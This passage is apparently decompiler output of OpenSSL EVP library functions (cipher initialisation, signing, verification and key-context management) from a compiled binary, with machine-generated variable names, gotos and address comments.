        v11 = v16;
        v14 = 0;
        v13 = a2;
        v12 = a5;
        if (v16 != 0) {
            goto lab_0x45888e;
        } else {
            goto lab_0x4588af;
        }
    } else {
        // 0x458878
        if ((int32_t)ENGINE_init(v4) == 0) {
            // 0x458b40
            ERR_put_error(6, 123, 134, "evp_enc.c", 190);
            // 0x458951
            return 0;
        }
        // 0x458878
        v10 = *(int32_t *)&v1;
        v11 = v4;
        goto lab_0x45888e;
    }
  lab_0x458851:;
    int64_t * v17 = (int64_t *)(a1 + 112); // 0x458851
    int64_t v18 = *v17; // 0x458851
    EVP_CIPHER_CTX_cleanup(a1);
    *(int32_t *)(a1 + 16) = v2;
    *v17 = v18;
    v8 = v18;
    goto lab_0x45886f;
  lab_0x45888e:
    // 0x45888e
    v1 = v10;
    int64_t v19 = ENGINE_get_cipher(v11, v10, v8); // 0x458894
    v14 = v11;
    v13 = v19;
    v12 = 207;
    if (v19 == 0) {
        // 0x458b40
        ERR_put_error(6, 123, 134, "evp_enc.c", 207);
        // 0x458951
        return 0;
    }
    goto lab_0x4588af;
  lab_0x4588af:
    // 0x4588af
    *v6 = v14;
    uint32_t v20 = *(int32_t *)(v13 + 48); // 0x4588af
    int64_t v21 = v20; // 0x4588af
    *(int64_t *)a1 = v13;
    if (v20 != 0) {
        // 0x458b68
        v1 = (int64_t)"evp_enc.c";
        int64_t v22 = CRYPTO_malloc(v21, "evp_enc.c", 224, (int64_t)a4, v12); // 0x458b74
        *(int64_t *)(a1 + 120) = v22;
        if (v22 == 0) {
            // 0x458b86
            ERR_put_error(6, 123, 65, "evp_enc.c", 227);
            // 0x458951
            return 0;
        }
    } else {
        // 0x4588bd
        *(int64_t *)(a1 + 120) = 0;
    }
    // 0x4588c5
    *(int64_t *)(a1 + 112) = 0;
    *(int32_t *)(a1 + 104) = *(int32_t *)(v13 + 8);
    v7 = v21;
    if ((*(char *)(v21 + 16) & 64) != 0) {
        int64_t v23 = EVP_CIPHER_CTX_ctrl(a1); // 0x458ac9
        v7 = a1;
        if ((int32_t)v23 == 0) {
            // 0x458b40
            ERR_put_error(6, 123, 134, "evp_enc.c", 241);
            // 0x458951
            return 0;
        }
    }
    goto lab_0x4588e0;
}

// Address range: 0x458c60 - 0x458c68
int64_t EVP_DecryptInit_ex(int64_t * a1, int64_t a2, int32_t a3, int64_t * a4, int64_t a5, int64_t a6) {
    // 0x458c60
    return EVP_CipherInit_ex((int64_t)a1, a2, a3, (int32_t)(int64_t)a4, (int32_t)a5, 0);
}

// Address range: 0x458c70 - 0x458c7b
int64_t EVP_EncryptInit_ex(int64_t a1, int64_t a2, int32_t a3, int64_t a4, int64_t * a5) {
    // 0x458c70
    return EVP_CipherInit_ex(a1, a2, a3, (int32_t)a4, (int32_t)(int64_t)a5, 1);
}

// Address range: 0x458c80 - 0x458c98
int64_t EVP_CIPHER_CTX_init(int64_t a1) {
    // 0x458c80
    FIPS_selftest_check();
    __asm_rep_stosq_memset((char *)a1, 0, 21);
    return 0;
}

// Address range: 0x458f10 - 0x458f1a
int64_t EVP_get_cipherbyname(int64_t a1, int64_t a2) {
    // 0x458f10
    return OBJ_NAME_get(a1, 2);
}

// Address range: 0x459020 - 0x459028
int64_t EVP_sha1(void) {
    // 0x459020
    return &g158;
}

// Address range: 0x459030 - 0x459038
int64_t EVP_sha224(void) {
    // 0x459030
    return &g157;
}

// Address range: 0x459040 - 0x459048
int64_t EVP_sha256(void) {
    // 0x459040
    return &g156;
}

// Address range: 0x459050 - 0x459058
int64_t EVP_sha384(void) {
    // 0x459050
    return &g155;
}

// Address range: 0x459060 - 0x459068
int64_t EVP_sha512(int64_t a1, int64_t a2) {
    // 0x459060
    return &g154;
}

// Address range: 0x459120 - 0x459400
int64_t EVP_SignFinal(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5) {
    // 0x459120
    int64_t v1; // bp-200, 0x459120
    int64_t v2 = &v1; // 0x45914b
    int32_t * v3 = (int32_t *)a3; // 0x45914e
    *v3 = 0;
    int64_t v4 = __readfsqword(40); // 0x459157
    EVP_MD_CTX_init(v2);
    int64_t v5 = EVP_MD_CTX_copy_ex(&v1, a1); // 0x459178
    int64_t v6 = 0; // 0x45917f
    int64_t v7 = 0; // 0x45917f
    int64_t v8; // 0x459120
    int64_t v9; // 0x459120
    int64_t v10; // bp-136, 0x459120
    int32_t v11; // bp-140, 0x459120
    int32_t v12; // bp-152, 0x459120
    int64_t v13; // 0x459274
    if ((int32_t)v5 == 0) {
        goto lab_0x45919f;
    } else {
        int64_t v14 = EVP_DigestFinal_ex(&v1, &v10, (int64_t *)&v11); // 0x459191
        v6 = 0;
        v7 = 0;
        if ((int32_t)v14 != 0) {
            // 0x459200
            EVP_MD_CTX_cleanup(&v1);
            if ((*(char *)(v2 + 16) & 4) != 0) {
                // 0x459260
                v12 = EVP_PKEY_size(a4);
                v13 = EVP_PKEY_CTX_new(a4, 0);
                v6 = 0;
                v7 = 0;
                if (v13 == 0) {
                    goto lab_0x45919f;
                } else {
                    int64_t v15 = EVP_PKEY_sign_init(v13); // 0x459288
                    v6 = 0;
                    v7 = v13;
                    if ((int32_t)v15 < 1) {
                        goto lab_0x45919f;
                    } else {
                        int64_t v16 = EVP_PKEY_CTX_ctrl(v13, 0xffffffff, 248, 1, 0, v13); // 0x4592ae
                        v6 = 0;
                        v7 = v13;
                        if ((int32_t)v16 < 1) {
                            goto lab_0x45919f;
                        } else {
                            int64_t * v17 = (int64_t *)(a1 + 16); // 0x4592bb
                            int64_t v18 = *v17; // 0x4592bb
                            v8 = v18;
                            if ((v18 & 16) != 0) {
                                int64_t v19 = EVP_PKEY_CTX_ctrl(v13, 6, 0xffffffff, 0x1001, 5, 0); // 0x4593d1
                                v6 = 0;
                                v7 = v13;
                                if ((int32_t)v19 < 1) {
                                    goto lab_0x45919f;
                                } else {
                                    // 0x4593da
                                    v8 = *v17;
                                    goto lab_0x4592c7;
                                }
                            } else {
                                goto lab_0x4592c7;
                            }
                        }
                    }
                }
            } else {
                int64_t v20 = 0;
                int32_t v21 = *(int32_t *)(v2 + 80 + v20); // 0x459215
                while (v21 != 0) {
                    int64_t v22; // 0x459120
                    if (*(int32_t *)&v22 == v21) {
                        int64_t v23 = *(int64_t *)(v2 + 64); // 0x459367
                        if (v23 == 0) {
                            // 0x45938e
                            ERR_put_error(6, 107, 104, "p_sign.c", 150);
                            v9 = 0;
                            goto lab_0x4591a7;
                        } else {
                            // 0x459370
                            v9 = v23 & 0xffffffff;
                            goto lab_0x4591a7;
                        }
                    }
                    // 0x459228
                    if (v20 == 12) {
                        // break -> 0x459232
                        break;
                    }
                    v20 += 4;
                    v21 = *(int32_t *)(v2 + 80 + v20);
                }
                // 0x459232
                ERR_put_error(6, 107, 110, "p_sign.c", 144);
                v9 = 0;
                goto lab_0x4591a7;
            }
        } else {
            goto lab_0x45919f;
        }
    }
  lab_0x45919f:
    // 0x45919f
    EVP_PKEY_CTX_free(v7);
    v9 = v6;
    goto lab_0x4591a7;
  lab_0x4591a7:
    // 0x4591a7
    if (v4 != __readfsqword(40)) {
        // 0x4593ee
        __stack_chk_fail();
        return &g299;
    }
    // 0x4591c0
    return v9 & 0xffffffff;
  lab_0x4592c7:
    // 0x4592c7
    if ((v8 & 32) == 0) {
        goto lab_0x45932f;
    } else {
        int64_t v24 = EVP_PKEY_CTX_ctrl(v13, 6, 0xffffffff, 0x1001, 6, 0); // 0x4592e6
        v6 = 0;
        v7 = v13;
        if ((int32_t)v24 < 1) {
            goto lab_0x45919f;
        } else {
            uint16_t v25 = *(int16_t *)(a1 + 18); // 0x4592ef
            int32_t v26 = -1; // 0x4592fb
            if (v25 != -1) {
                // 0x459301
                v26 = v25 == -2 ? -2 : (int32_t)v25;
            }
            int64_t v27 = EVP_PKEY_CTX_ctrl(v13, 6, 24, 0x1002, v26, 0); // 0x459326
            v6 = 0;
            v7 = v13;
            if ((int32_t)v27 < 1) {
                goto lab_0x45919f;
            } else {
                goto lab_0x45932f;
            }
        }
    }
  lab_0x45932f:;
    int64_t v28 = EVP_PKEY_sign(v13, a2, (int64_t *)&v12, &v10, (int64_t)v11); // 0x459342
    v6 = 0;
    v7 = v13;
    if ((int32_t)v28 >= 1) {
        // 0x45934b
        *v3 = v12;
        v6 = 1;
        v7 = v13;
    }
    goto lab_0x45919f;
}

// Address range: 0x459400 - 0x4596b0
int64_t EVP_VerifyFinal(int64_t * a1, int64_t a2, int32_t a3, int64_t a4, int64_t a5) {
    int64_t v1 = (int64_t)a1;
    int64_t v2; // bp-200, 0x459400
    int64_t v3 = &v2; // 0x45942b
    int64_t v4 = __readfsqword(40); // 0x459434
    EVP_MD_CTX_init(v3);
    int64_t v5 = EVP_MD_CTX_copy_ex(&v2, v1); // 0x459452
    int64_t v6 = 0; // 0x459459
    int64_t v7 = 0; // 0x459459
    int64_t v8; // 0x459400
    int64_t v9; // 0x459400
    int64_t v10; // 0x45953d
    if ((int32_t)v5 == 0) {
        goto lab_0x459478;
    } else {
        // 0x45945b
        int64_t v11; // bp-136, 0x459400
        int64_t v12; // bp-140, 0x459400
        int64_t v13 = EVP_DigestFinal_ex(&v2, &v11, &v12); // 0x45946b
        v6 = 0;
        v7 = 0;
        if ((int32_t)v13 != 0) {
            // 0x4594d8
            EVP_MD_CTX_cleanup(&v2);
            if ((*(char *)(v3 + 16) & 4) != 0) {
                // 0x459538
                v10 = EVP_PKEY_CTX_new(a4, 0);
                v6 = 0xffffffff;
                v7 = 0;
                if (v10 == 0) {
                    goto lab_0x459478;
                } else {
                    int64_t v14 = EVP_PKEY_verify_init(v10); // 0x459551
                    v6 = 0xffffffff;
                    v7 = v10;
                    if ((int32_t)v14 < 1) {
                        goto lab_0x459478;
                    } else {
                        int64_t v15 = EVP_PKEY_CTX_ctrl(v10, 0xffffffff, 248, 1, 0, v10); // 0x459576
                        v6 = 0xffffffff;
                        v7 = v10;
                        if ((int32_t)v15 < 1) {
                            goto lab_0x459478;
                        } else {
                            int64_t * v16 = (int64_t *)(v1 + 16); // 0x459583
                            int64_t v17 = *v16; // 0x459583
                            v8 = v17;
                            if ((v17 & 16) != 0) {
                                int64_t v18 = EVP_PKEY_CTX_ctrl(v10, 6, 0xffffffff, 0x1001, 5, 0); // 0x45968b
                                v6 = 0xffffffff;
                                v7 = v10;
                                if ((int32_t)v18 < 1) {
                                    goto lab_0x459478;
                                } else {
                                    // 0x459694
                                    v8 = *v16;
                                    goto lab_0x45958f;
                                }
                            } else {
                                goto lab_0x45958f;
                            }
                        }
                    }
                }
            } else {
                int64_t v19 = 0;
                int32_t v20 = *(int32_t *)(v3 + 80 + v19); // 0x4594eb
                while (v20 != 0) {
                    int64_t v21; // 0x459400
                    if (v20 == (int32_t)v21) {
                        int64_t v22 = *(int64_t *)(v3 + 72); // 0x459622
                        if (v22 == 0) {
                            // 0x459648
                            ERR_put_error(6, 108, 105, "p_verify.c", 131);
                            v9 = 0;
                            goto lab_0x459480;
                        } else {
                            // 0x45962b
                            v9 = v22 & 0xffffffff;
                            goto lab_0x459480;
                        }
                    }
                    // 0x4594fc
                    if (v19 == 12) {
                        // break -> 0x459506
                        break;
                    }
                    v19 += 4;
                    v20 = *(int32_t *)(v3 + 80 + v19);
                }
                // 0x459506
                ERR_put_error(6, 108, 110, "p_verify.c", 126);
                v9 = 0xffffffff;
                goto lab_0x459480;
            }
        } else {
            goto lab_0x459478;
        }
    }
  lab_0x459478:
    // 0x459478
    EVP_PKEY_CTX_free(v7);
    v9 = v6;
    goto lab_0x459480;
  lab_0x459480:
    // 0x459480
    if (v4 != __readfsqword(40)) {
        // 0x4596a8
        __stack_chk_fail();
        return &g299;
    }
    // 0x459499
    return v9 & 0xffffffff;
  lab_0x45958f:
    // 0x45958f
    if ((v8 & 32) == 0) {
        goto lab_0x4595f7;
    } else {
        int64_t v23 = EVP_PKEY_CTX_ctrl(v10, 6, 0xffffffff, 0x1001, 6, 0); // 0x4595ae
        v6 = 0xffffffff;
        v7 = v10;
        if ((int32_t)v23 < 1) {
            goto lab_0x459478;
        } else {
            uint16_t v24 = *(int16_t *)(v1 + 18); // 0x4595b7
            int32_t v25 = -1; // 0x4595c3
            if (v24 != -1) {
                // 0x4595c9
                v25 = v24 == -2 ? -2 : (int32_t)v24;
            }
            int64_t v26 = EVP_PKEY_CTX_ctrl(v10, 6, 24, 0x1002, v25, 0); // 0x4595ee
            v6 = 0xffffffff;
            v7 = v10;
            if ((int32_t)v26 < 1) {
                goto lab_0x459478;
            } else {
                goto lab_0x4595f7;
            }
        }
    }
  lab_0x4595f7:
    // 0x4595f7
    v6 = EVP_PKEY_verify(v10) & 0xffffffff;
    v7 = v10;
    goto lab_0x459478;
}

// Address range: 0x4596e0 - 0x459703
int64_t EVP_PKEY_size(int64_t a1) {
    if (a1 == 0) {
        // 0x4596f7
        return 0;
    }
    int64_t v1 = *(int64_t *)(a1 + 16); // 0x4596e5
    if (v1 == 0) {
        // 0x4596f7
        return 0;
    }
    int64_t result = *(int64_t *)(v1 + 88); // 0x4596ee
    if (result != 0) {
        // 0x4596f7
        return result;
    }
    // 0x4596f7
    return 0;
}

// Address range: 0x459960 - 0x45999b
int64_t EVP_PKEY_free_it(int64_t a1) {
    int64_t v1 = *(int64_t *)(a1 + 16); // 0x459961
    int64_t v2 = 0; // 0x45996b
    if (v1 != 0) {
        int64_t v3 = *(int64_t *)(v1 + 160); // 0x45996d
        v2 = 0;
        if (v3 != 0) {
            // 0x459979
            *(int64_t *)(a1 + 32) = 0;
            v2 = v3;
        }
    }
    int64_t * v4 = (int64_t *)(a1 + 24); // 0x459983
    int64_t v5 = *v4; // 0x459983
    int64_t result = v2; // 0x45998a
    if (v5 != 0) {
        // 0x45998c
        result = ENGINE_finish(v5);
        *v4 = 0;
    }
    // 0x459999
    return result;
}

// Address range: 0x4599a0 - 0x4599f6
int64_t EVP_PKEY_free(int64_t a1) {
    if (a1 == 0) {
        // 0x4599cd
        int64_t result; // 0x4599a0
        return result;
    }
    int64_t result2 = CRYPTO_add_lock(a1 + 8, 0xffffffff, 10, "p_lib.c", 393); // 0x4599c4
    if ((int32_t)result2 >= 1) {
        // 0x4599cd
        return result2;
    }
    // 0x4599d0
    EVP_PKEY_free_it(a1);
    int64_t v1 = *(int64_t *)(a1 + 48); // 0x4599d8
    int64_t v2 = 0xffffffff; // 0x4599df
    if (v1 != 0) {
        // 0x4599e1
        v2 = g163;
        sk_pop_free(v1, v2);
    }
    // 0x4599ed
    return CRYPTO_free(a1, v2);
}

// Address range: 0x459c30 - 0x459d60
int64_t pkey_set_type(int64_t a1, uint32_t a2, int64_t a3, int64_t a4) {
    int64_t v1 = 0; // bp-48, 0x459c56
    if (a1 != 0) {
        // 0x459c61
        if (*(int64_t *)(a1 + 32) != 0) {
            // 0x459c68
            EVP_PKEY_free_it(a1);
        }
        // 0x459c6d
        if (*(int32_t *)(a1 + 4) == a2) {
            // 0x459cf0
            if (*(int64_t *)(a1 + 16) != 0) {
                // 0x459cd2
                return 1;
            }
        }
        int64_t * v2 = (int64_t *)(a1 + 24); // 0x459c72
        int64_t v3 = *v2; // 0x459c72
        if (v3 != 0) {
            // 0x459c7b
            ENGINE_finish(v3);
            *v2 = 0;
        }
    }
    int64_t v4; // 0x459c30
    if (a3 == 0) {
        // 0x459d20
        v4 = EVP_PKEY_asn1_find(&v1, (int64_t)a2);
    } else {
        int64_t v5 = EVP_PKEY_asn1_find_str((int32_t)(int64_t)&v1, a3, a4 & 0xffffffff); // 0x459c9c
        v4 = v5;
    }
    // 0x459ca4
    if (a1 == 0) {
        // 0x459d08
        if (v1 != 0) {
            // 0x459d12
            ENGINE_finish(v1);
        }
    }
    if (v4 == 0) {
        // 0x459d38
        ERR_put_error(6, 158, 156, "p_lib.c", 239);
        // 0x459cd2
        return 0;
    }
    // 0x459cb2
    if (a1 != 0) {
        // 0x459cb7
        *(int64_t *)(a1 + 16) = v4;
        *(int64_t *)(a1 + 24) = v1;
        *(int32_t *)(a1 + 4) = a2;
        *(int32_t *)a1 = *(int32_t *)v4;
    }
    // 0x459cd2
    return 1;
}

// Address range: 0x459d70 - 0x459d7c
int64_t EVP_PKEY_set_type(int64_t a1, int64_t a2, int64_t a3) {
    // 0x459d70
    return pkey_set_type(a1, (int32_t)a2, 0, 0xffffffff);
}

// Address range: 0x459d80 - 0x459dbc
int64_t EVP_PKEY_assign(int64_t a1, int64_t a2, int64_t a3) {
    int64_t result = 0; // 0x459d9f
    if ((int32_t)EVP_PKEY_set_type(a1, a2, a3) != 0) {
        // 0x459da1
        *(int64_t *)(a1 + 32) = a3;
        result = a3 != 0;
    }
    // 0x459dad
    return result;
}

// Address range: 0x459e80 - 0x459ebd
int64_t EVP_PKEY_set1_RSA(int64_t a1, int64_t a2) {
    int64_t v1 = EVP_PKEY_assign(a1, 6, a2); // 0x459e99
    if ((int32_t)v1 != 0) {
        // 0x459ea4
        RSA_up_ref(a2);
    }
    // 0x459eac
    return v1 & 0xffffffff;
}

// Address range: 0x459ec0 - 0x459f4c
int64_t EVP_PKEY_new(int64_t a1, int64_t a2, int64_t a3) {
    // 0x459ec0
    int64_t v1; // 0x459ec0
    int64_t v2; // 0x459ec0
    int64_t result = CRYPTO_malloc(56, "p_lib.c", 186, v2, v1); // 0x459ed5
    if (result == 0) {
        // 0x459f1f
        ERR_put_error(6, 106, 65, "p_lib.c", 189);
    } else {
        // 0x459edf
        *(int32_t *)result = 0;
        *(int32_t *)(result + 4) = 0;
        *(int32_t *)(result + 8) = 1;
        *(int64_t *)(result + 16) = 0;
        *(int64_t *)(result + 24) = 0;
        *(int64_t *)(result + 32) = 0;
        *(int64_t *)(result + 48) = 0;
        *(int32_t *)(result + 40) = 1;
    }
    // 0x459f1a
    return result;
}

// Address range: 0x45ac60 - 0x45ac67
int64_t EVP_CIPHER_CTX_block_size(int64_t * a1) {
    // 0x45ac60
    return (int64_t)*(int32_t *)((int64_t)a1 + 4);
}

// Address range: 0x45ac70 - 0x45ac74
int64_t EVP_CIPHER_CTX_cipher(int64_t result) {
    // 0x45ac70
    return result;
}

// Address range: 0x45ac90 - 0x45ac98
int64_t EVP_CIPHER_CTX_flags(int64_t a1) {
    // 0x45ac90
    return *(int64_t *)(a1 + 16);
}

// Address range: 0x45acd0 - 0x45acd7
int64_t EVP_CIPHER_CTX_iv_length(int64_t a1) {
    // 0x45acd0
    return (int64_t)*(int32_t *)(a1 + 12);
}

// Address range: 0x45ad20 - 0x45ad24
int64_t EVP_MD_block_size(int64_t a1) {
    // 0x45ad20
    return (int64_t)*(int32_t *)(a1 + 100);
}

// Address range: 0x45ad70 - 0x45ad78
int64_t EVP_MD_CTX_set_flags(int64_t a1, int64_t a2) {
    int64_t * v1 = (int64_t *)(a1 + 16); // 0x45ad73
    *v1 = *v1 | 0x100000000 * a2 / 0x100000000;
    int64_t result; // 0x45ad70
    return result;
}

// Address range: 0x45ad80 - 0x45ad8a
int64_t EVP_MD_CTX_clear_flags(int64_t a1, int64_t a2) {
    int64_t * v1 = (int64_t *)(a1 + 16); // 0x45ad85
    *v1 = *v1 & (0x100000000 * a2 ^ -0x100000000) / 0x100000000;
    int64_t result; // 0x45ad80
    return result;
}

// Address range: 0x45ad90 - 0x45ad96
int64_t EVP_MD_CTX_test_flags(int64_t a1, int64_t a2) {
    // 0x45ad90
    return (int64_t)(*(int32_t *)(a1 + 16) & (int32_t)a2);
}

// Address range: 0x45add0 - 0x45ae07
int64_t EVP_MD_size(int64_t a1) {
    int64_t result; // 0x45add0
    if (a1 == 0) {
        // 0x45ade1
        ERR_put_error(6, 162, 159, "evp_lib.c", 273);
        result = 0xffffffff;
    } else {
        // 0x45add9
        result = (int64_t)*(int32_t *)(a1 + 8);
    }
    // 0x45addc
    return result;
}

// Address range: 0x45ae10 - 0x45ae66
int64_t EVP_Cipher(int64_t a1, int64_t * a2, int64_t a3, int32_t a4) {
    // 0x45ae10
    FIPS_selftest_check();
    return *(int64_t *)(a1 + 32);
}

// Address range: 0x45c920 - 0x45ca4b
int64_t EVP_PKEY_CTX_ctrl(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int32_t a5, int64_t a6) {
    if (a1 == 0 || *(int64_t *)(a1 + 192) == 0) {
        // 0x45c9c0
        ERR_put_error(6, 137, 147, "pmeth_lib.c", 390);
        // 0x45c977
        return 0xfffffffe;
    }
    int32_t v1 = a2; // 0x45c949
    if (v1 != -1 && (int32_t)a1 != v1) {
        // 0x45c977
        return 0xffffffff;
    }
    uint32_t result = *(int32_t *)(a1 + 32); // 0x45c94e
    if (result == 0) {
        // 0x45c9f0
        ERR_put_error(6, 137, 149, "pmeth_lib.c", 398);
        // 0x45c977
        return 0xffffffff;
    }
    int32_t v2 = a3; // 0x45c959
    if (v2 != -1 == (result & v2) == 0) {
        // 0x45ca20
        ERR_put_error(6, 137, 148, "pmeth_lib.c", 404);
        // 0x45c977
        return 0xffffffff;
    }
    // 0x45c966
    if (result != -2) {
        // 0x45c977
        return result;
    }
    // 0x45c980
    ERR_put_error(6, 137, 147, "pmeth_lib.c", 411);
    return 0xfffffffe;
}

// Address range: 0x45cb20 - 0x45cb72
int64_t EVP_PKEY_CTX_free(int64_t a1) {
    // 0x45cb20
    if (a1 == 0) {
        // 0x45cb70
        int64_t result; // 0x45cb20
        return result;
    }
    int64_t v1 = *(int64_t *)(a1 + 16); // 0x45cb3c
    if (v1 != 0) {
        // 0x45cb45
        EVP_PKEY_free(v1);
    }
    int64_t v2 = *(int64_t *)(a1 + 24); // 0x45cb4a
    if (v2 != 0) {
        // 0x45cb53
        EVP_PKEY_free(v2);
    }
    int64_t v3 = *(int64_t *)(a1 + 8); // 0x45cb58
    if (v3 != 0) {
        // 0x45cb61
        ENGINE_finish(v3);
    }
    // 0x45cb66
    int64_t v4; // 0x45cb20
    return CRYPTO_free(a1, v4);
}

// Address range: 0x45cb80 - 0x45cb95
int64_t EVP_PKEY_meth_free(int64_t a1) {
    // 0x45cb80
    int64_t result; // 0x45cb80
    if (a1 == 0) {
        // 0x45cb8b
        return result;
    }
    // 0x45cb85
    if (*(char *)(a1 + 4) % 2 != 0) {
        // 0x45cb90
        int64_t v1; // 0x45cb80
        return CRYPTO_free(a1, v1);
    }
    // 0x45cb8b
    return result;
}

// Address range: 0x45cc10 - 0x45cd48
int64_t EVP_PKEY_CTX_dup(int64_t a1) {
    // 0x45cc10
    if (a1 == 0) {
        // 0x45cc23
        return 0;
    }
    int64_t * v1 = (int64_t *)(a1 + 16); // 0x45cc30
    if (*v1 == 0) {
        // 0x45cc23
        return 0;
    }
    int64_t * v2 = (int64_t *)(a1 + 8); // 0x45cc37
    int64_t v3 = *v2; // 0x45cc37
    if (v3 != 0) {
        // 0x45cc40
        if ((int32_t)ENGINE_init(v3) == 0) {
            // 0x45cd20
            ERR_put_error(6, 156, 38, "pmeth_lib.c", 316);
            // 0x45cc23
            return 0;
        }
    }
    // 0x45cc4d
    int64_t v4; // 0x45cc10
    int64_t v5; // 0x45cc10
    int64_t v6 = CRYPTO_malloc(80, "pmeth_lib.c", 320, v5, v4); // 0x45cc5e
    if (v6 == 0) {
        // 0x45cc23
        return 0;
    }
    int64_t v7 = *v1; // 0x45cc6e
    *(int64_t *)v6 = 80;
    *(int64_t *)(v6 + 8) = *v2;
    int64_t v8 = 0; // 0x45cc83
    if (v7 != 0) {
        // 0x45cc85
        CRYPTO_add_lock(v7 + 8, 1, 10, "pmeth_lib.c", 330);
        v8 = *v1;
    }
    int64_t * v9 = (int64_t *)(a1 + 24); // 0x45cca9
    int64_t v10 = *v9; // 0x45cca9
    *(int64_t *)(v6 + 16) = v8;
    int64_t v11 = 0; // 0x45ccb6
    if (v10 != 0) {
        // 0x45ccb8
        CRYPTO_add_lock(v10 + 8, 1, 10, "pmeth_lib.c", 335);
        v11 = *v9;
    }
    // 0x45ccdc
    *(int64_t *)(v6 + 24) = v11;
    *(int64_t *)(v6 + 40) = 0;
    *(int64_t *)(v6 + 48) = 0;
    *(int32_t *)(v6 + 32) = *(int32_t *)(a1 + 32);
    int32_t v12 = v6; // 0x45cd02
    int64_t result = v6; // 0x45cd04
    if (v12 >= 0 != v12 != 0) {
        // 0x45cd0a
        EVP_PKEY_CTX_free(v6);
        result = 0;
    }
    // 0x45cc23
    return result;
}

// Address range: 0x45ce70 - 0x45ceec
int64_t EVP_PKEY_meth_find(int64_t a1) {
    int64_t v1 = 0x100000000 * a1 / 0x100000000; // bp-232, 0x45ce7f
    int64_t v2 = &v1; // 0x45ce82
    int64_t v3 = v2; // bp-16, 0x45ce85
    int64_t * v4 = (int64_t *)g171; // 0x45ce8d
    int64_t v5 = *v4; // 0x45ce8d
    if (v5 != 0) {
        // 0x45ce95
        int64_t v6; // 0x45ce70
        int64_t v7; // 0x45ce70
        int64_t v8 = sk_find(v5, (int32_t)v2, v6, v7); // 0x45ce95
        if ((int32_t)v8 >= 0) {
            // 0x45cea8
            return sk_value(*v4, v8 & 0xffffffff);
        }
    }
    // 0x45ceb8
    int64_t v9; // 0x45ce70
    int64_t v10 = OBJ_bsearch_(&v3, (int64_t *)0x73d240, 6, 8, 0x45c680, v9); // 0x45ced8
    int64_t result = 0; // 0x45cee5
    if (v10 != 0) {
        // 0x45cee7
        result = *(int64_t *)v10;
    }
    // 0x45cea8
    return result;
}

// Address range: 0x45cef0 - 0x45d0f7
int64_t int_ctx_new(int32_t a1, int64_t a2, int64_t a3) {
    int64_t v1 = a1;
    int64_t v2; // 0x45cef0
    int64_t v3; // 0x45cef0
    if ((int32_t)a3 == -1) {
        // 0x45d030
        if (a1 == 0) {
            // 0x45cfe1
            return 0;
        }
        int64_t v4 = *(int64_t *)(v1 + 16); // 0x45d040
        if (v4 == 0) {
            // 0x45cfe1
            return 0;
        }
        // 0x45d049
        v2 = (int64_t)*(int32_t *)v4;
        goto lab_0x45cf22;
    } else {
        int64_t v5 = a3 & 0xffffffff; // 0x45cefa
        v2 = v5;
        v3 = v5;
        if (a1 == 0) {
            goto lab_0x45d000;
        } else {
            goto lab_0x45cf22;
        }
    }
  lab_0x45cf22:;
    int64_t v6 = *(int64_t *)(v1 + 24); // 0x45cf22
    int64_t v7 = v2; // 0x45cf2a
    int64_t v8 = v6; // 0x45cf2a
    v3 = v2;
    if (v6 == 0) {
        goto lab_0x45d000;
    } else {
        goto lab_0x45cf33;
    }
  lab_0x45d000:
    // 0x45d000
    v7 = v3;
    v8 = a2;
    int64_t v9; // 0x45cef0
    int64_t v10; // 0x45cef0
    int64_t v11; // 0x45cef0
    int64_t v12; // 0x45cef0
    if (a2 != 0) {
        goto lab_0x45cf33;
    } else {
        int64_t v13 = v3 & 0xffffffff;
        int64_t v14 = ENGINE_get_pkey_meth_engine(v13); // 0x45d00b
        v9 = v13;
        v10 = v14;
        if (v14 != 0) {
            goto lab_0x45cf43;
        } else {
            // 0x45d01c
            v11 = v14;
            v12 = EVP_PKEY_meth_find(v13);
            goto lab_0x45cf50;
        }
    }
  lab_0x45cf33:
    // 0x45cf33
    if ((int32_t)ENGINE_init(v8) == 0) {
        // 0x45d050
        ERR_put_error(6, 157, 38, "pmeth_lib.c", 145);
        // 0x45cfe1
        return 0;
    }
    // 0x45cf33
    v9 = v7 & 0xffffffff;
    v10 = v8;
    goto lab_0x45cf43;
  lab_0x45cf43:;
    int64_t v15 = ENGINE_get_pkey_meth(v10, v9, a3); // 0x45cf48
    v11 = v10;
    v12 = v15;
    goto lab_0x45cf50;
  lab_0x45cf50:
    // 0x45cf50
    if (v12 == 0) {
        // 0x45d080
        ERR_put_error(6, 157, 156, "pmeth_lib.c", 164);
        // 0x45cfe1
        return 0;
    }
    // 0x45cf59
    int64_t v16; // 0x45cef0
    int64_t v17; // 0x45cef0
    int64_t v18 = CRYPTO_malloc(80, "pmeth_lib.c", 168, v17, v16); // 0x45cf6a
    if (v18 == 0) {
        if (v11 != 0) {
            // 0x45d0b5
            ENGINE_finish(v11);
        }
        // 0x45d0bd
        ERR_put_error(6, 157, 65, "pmeth_lib.c", 175);
        // 0x45cfe1
        return 0;
    }
    // 0x45cf7b
    *(int64_t *)(v18 + 8) = v11;
    *(int64_t *)v18 = v12;
    *(int32_t *)(v18 + 32) = 0;
    *(int64_t *)(v18 + 16) = v1;
    *(int64_t *)(v18 + 24) = 0;
    *(int64_t *)(v18 + 56) = 0;
    if (a1 != 0) {
        // 0x45cfa2
        CRYPTO_add_lock(v1 + 8, 1, 10, "pmeth_lib.c", 185);
    }
    int64_t v19 = *(int64_t *)(v12 + 8); // 0x45cfc3
    *(int64_t *)(v18 + 40) = 0;
    int64_t result = v18; // 0x45cfd2
    if (v19 != 0 == (int32_t)v19 < 1) {
        // 0x45d0e8
        EVP_PKEY_CTX_free(v18);
        result = 0;
    }
    // 0x45cfe1
    return result;
}

// Address range: 0x45d110 - 0x45d11a
int64_t EVP_PKEY_CTX_new(int64_t a1, int32_t a2) {
    // 0x45d110
    return int_ctx_new((int32_t)a1, (int64_t)a2, 0xffffffff);
}

// Address range: 0x45d310 - 0x45d398
int64_t EVP_PKEY_verify(int64_t a1) {
    if (a1 == 0) {
        // 0x45d370
        ERR_put_error(6, 142, 150, "pmeth_fn.c", 144);
        // 0x45d330
        return 0xfffffffe;
    }
    int64_t v1 = *(int64_t *)(a1 + 88); // 0x45d321
    if (v1 == 0) {
        // 0x45d370
        ERR_put_error(6, 142, 150, "pmeth_fn.c", 144);
        // 0x45d330
        return 0xfffffffe;
    }
    int64_t result = v1; // 0x45d32e
    if (*(int32_t *)(a1 + 32) != 16) {
        // 0x45d340
        ERR_put_error(6, 142, 151, "pmeth_fn.c", 149);
        result = 0xffffffff;
    }
    // 0x45d330
    return result;
}

